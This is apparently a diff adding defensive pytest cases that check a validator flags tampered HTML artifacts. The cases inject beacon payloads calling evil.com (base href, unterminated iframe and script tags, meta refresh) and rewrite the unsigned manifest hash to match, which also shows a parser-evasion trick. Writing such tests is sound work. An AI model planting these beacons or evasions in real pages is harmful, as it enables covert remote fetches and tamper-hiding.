@@ -784,6 +784,52 @@ def test_check_rejects_tampered_autofetch_surfaces(tmp_path, snippet, expected):
     assert any(error["message"] == expected for error in checked["errors"])
 
 
+@pytest.mark.parametrize(
+    ("mutate", "expected"),
+    [
+        # <base> re-roots every relative URL cross-origin; it was in no checked tag set.
+        (lambda h: h.replace("<head>", '<head><base href="//evil.com/">', 1), "index.html contains an auto-fetching remote URL attribute"),
+        # Unterminated final tags at EOF: the HTMLParser probe drops them, but a browser
+        # completes the tag at EOF and fetches. The whole-file backstop catches them.
+        (lambda h: h + '\n<iframe src="//evil.com/x"', "index.html contains an active or auto-fetching surface"),
+        (lambda h: h + '\n<script src="//evil.com/b.js"', "index.html contains an auto-fetching remote URL attribute"),
+        (lambda h: h + '\n<meta http-equiv="refresh" content="0;url=//evil.com/"', "index.html contains an active or auto-fetching surface"),
+        # Forbidden tag with no remote URL (srcdoc) -- caught by the tag marker, not the URL scan.
+        (lambda h: h + '\n<iframe srcdoc="<b>x"', "index.html contains an active or auto-fetching surface"),
+    ],
+)
+def test_check_rejects_parser_evasion_and_base_beacons(tmp_path, mutate, expected):
+    # These beacons pass a naive check because the attacker can also rewrite the unsigned
+    # manifest artifact_hash (a plain sibling file) to match the tampered index.html.
+    intent_path = tmp_path / "viewspec.intent.json"
+    intent_path.write_text(json.dumps(_bundle_json()), encoding="utf-8")
+    assert compile_intent_bundle_file_tool("viewspec.intent.json", "dist", cwd=tmp_path)["ok"] is True
+
+    html_path = tmp_path / "dist/index.html"
+    html_path.write_text(mutate(html_path.read_text(encoding="utf-8")), encoding="utf-8")
+    manifest_path = tmp_path / "dist/provenance_manifest.json"
+    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
+    manifest["artifact_hash"] = file_hash(html_path)
+    manifest_path.write_text(json.dumps(manifest, indent=2, sort_keys=True), encoding="utf-8")
+
+    checked = check_artifact_tool("dist", cwd=tmp_path)
+
+    assert_tool_schema(checked)
+    assert checked["ok"] is False
+    assert any(error["message"] == expected for error in checked["errors"])
+
+
+def test_autofetch_backstop_is_attribute_scoped_not_text():
+    # B1: a URL in visible TEXT (or a relative ref) is not a beacon and must not be flagged,
+    # while a URL in an attribute -- or a forbidden tag, even unterminated at EOF -- is caught.
+    from viewspec.local_tools_validators import _validate_no_autofetch_surfaces
+
+    assert _validate_no_autofetch_surfaces("<html><body><p>See https://docs.example.com now</p></body></html>") == []
+    assert _validate_no_autofetch_surfaces('<html><body><img src="logo.png" alt=""></body></html>') == []
+    assert _validate_no_autofetch_surfaces('<html><body></body></html>\n<iframe src="//evil.com/x"') != []
+    assert _validate_no_autofetch_surfaces('<html><head><base href="//evil.com/"></head><body></body></html>') != []
+
+
 def test_check_rejects_unknown_manifest_kind(tmp_path):
     intent_path = tmp_path / "viewspec.intent.json"
     intent_path.write_text(json.dumps(_bundle_json()), encoding="utf-8")
